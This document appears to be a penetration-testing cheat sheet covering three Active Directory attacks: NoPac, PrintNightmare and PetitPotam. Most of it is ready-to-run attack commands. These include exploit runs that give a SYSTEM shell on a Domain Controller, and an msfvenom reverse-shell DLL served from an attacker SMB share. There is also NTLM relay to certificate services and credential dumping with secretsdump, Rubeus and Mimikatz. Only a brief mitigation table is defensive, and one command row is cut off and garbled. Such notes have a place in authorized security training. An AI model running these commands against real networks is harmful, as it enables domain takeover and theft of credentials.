# Active Directory: Bleeding Edge Vulnerabilities

### **1. NoPac (SamAccountName Spoofing)**

**Technique Overview** NoPac (CVE-2021-42278 and CVE-2021-42287) exploits a flaw in how the **Security Account Manager (SAM)** and **Kerberos PAC** handle computer account names. It allows for **intra-domain privilege escalation** from a standard user to **Domain Admin** in a single workflow.

**Why it Matters** The attack works by renaming a new computer account to match a **Domain Controller's** `SamAccountName`. When a Kerberos **Ticket Granting Service (TGS)** is requested, the system issues a ticket for the DC instead of the renamed account, granting the attacker the identity of the Domain Controller.

**Operational Workflow**

1. **Verify Vulnerability**: Use a scanner to check if the system is patched and confirm the machine account quota.
2. **Impersonate Administrator**: Run the exploit to spoof the DC name and request a TGT for the built-in Administrator.
3. **Establish Access**: Drop into a semi-interactive shell or use the obtained ticket to perform a **DCSync**.

|Command|Purpose|
|:--|:--|
|`python3 scanner.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <TARGET_IP> -use-ldap`|Scans for NoPac vulnerability and checks account quota.|
|`python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <TARGET_IP> -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap`|Executes the exploit to gain a **SYSTEM shell** on the DC.|
|`python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <TARGET_IP> -dc-host <DC_HOST> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator`|Directly performs a **DCSync** to dump the Administrator hash.|

**Dangerous Settings & Constraints**

|Setting|Implication|
|:--|:--|
|`ms-DS-MachineAccountQuota` > 0|Required for the attack; allows standard users to add machine accounts (Default is 10).|
|**Windows Defender/EDR**|`smbexec.py` (used by NoPac) creates a service and batch files, which are highly **noisy** and easily detected.|
|**Pathing**|In `smbexec` shells, you must use **exact paths** as `cd` navigation is not supported.|

---

### **2. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**

**Technique Overview** PrintNightmare targets vulnerabilities in the **Print Spooler** service. It allows an attacker with standard domain credentials to achieve **Remote Code Execution (RCE)** and gain **SYSTEM privileges** on a target host, such as a Domain Controller.

**Why it Matters** The exploit leverages the **Print System Remote Protocol** to force the target to load a malicious DLL from an attacker-controlled SMB share.

**Operational Workflow**

1. **Enumerate Protocols**: Confirm the target has `MS-RPRN` or `MS-PAR` exposed via RPC.
2. **Generate Payload**: Create a malicious DLL specifically for the target architecture.
3. **Host Payload**: Set up an SMB share to deliver the DLL to the target.
4. **Prepare Listener**: Configure a handler to catch the incoming reverse shell.
5. **Execute Exploit**: Trigger the Print Spooler to load the remote DLL.

|Command|Purpose|
|:--|:--|
|`rpcdump.py @<TARGET_IP> \|egrep 'MS-RPRN\|
|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f dll > <DLL_NAME>.dll`|Generates the malicious DLL payload.|
|`sudo smbserver.py -smb2support <SHARE_NAME> /path/to/dll/`|Hosts the payload on an attacker-controlled SMB share.|
|`sudo python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '\\<ATTACK_IP>\<SHARE_NAME>\<DLL_NAME>.dll'`|Runs the exploit to force the target to execute the DLL.|

**Attack Implications**

- **Risk of Denial of Service (DoS)**: This attack can potentially crash the print spooler service on remote hosts.
- **Alternative Tooling**: Requires a specific version of Impacket (cube0x0) for successful execution.

---

### **3. PetitPotam (MS-EFSRPC)**

**Technique Overview** PetitPotam (CVE-2021-36942) is an **LSA spoofing** vulnerability that coerces a Domain Controller to authenticate to an attacker-controlled host via NTLM over port 445.

**Why it Matters** This can be performed **unauthenticated**. By relaying this authentication to **Active Directory Certificate Services (AD CS)**, an attacker can obtain a digital certificate for the Domain Controller, leading to total domain compromise via **DCSync**.

**Operational Workflow**

1. **Start Relay**: Configure `ntlmrelayx.py` to target the AD CS Web Enrollment page.
2. **Coerce Authentication**: Run PetitPotam to force the DC to authenticate to your relay.
3. **Extract Certificate**: Capture the **base64 encoded certificate** provided by the CA.
4. **Request TGT**: Use the certificate to request a Kerberos TGT for the DC account.
5. **DCSync**: Use the DC's TGT or recovered NT hash to dump domain secrets.

|Command|Purpose|
|:--|:--|
|`sudo ntlmrelayx.py -smb2support --target http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController`|Sets up the relay to capture and use coerced NTLM auth for certificate requests.|
|`python3 PetitPotam.py <ATTACK_IP> <TARGET_IP>`|Coerces the DC to authenticate to the attack machine.|
|`python3 gettgtpkinit.py <DOMAIN>/<DC_HOST>\$ -pfx-base64 <BASE64_CERT> <TICKET_NAME>.ccache`|Requests a TGT using the captured certificate.|
|`export KRB5CCNAME=<TICKET_NAME>.ccache`|Sets the environment variable to use the requested TGT for authentication.|
|`secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_HOST>.<DOMAIN>`|Performs a **DCSync** using the Kerberos ticket.|

**Alternate Windows Path (Rubeus/Mimikatz)** If using a Windows attack host with the captured certificate:

1. **Request TGT**: `.\Rubeus.exe asktgt /user:<DC_HOST>$ /certificate:<BASE64_CERT> /ptt`.
2. **DCSync**: `lsadump::dcsync /user:<DOMAIN>\krbtgt` within Mimikatz.

**Mitigation and Hardening**

|Step|Impact|
|:--|:--|
|**Apply Patches**|Specifically CVE-2021-36942, though this alone may not be sufficient if AD CS is misconfigured.|
|**AD CS Hardening**|Disable NTLM authentication on CA Web Enrollment pages and use authenticated API calls.|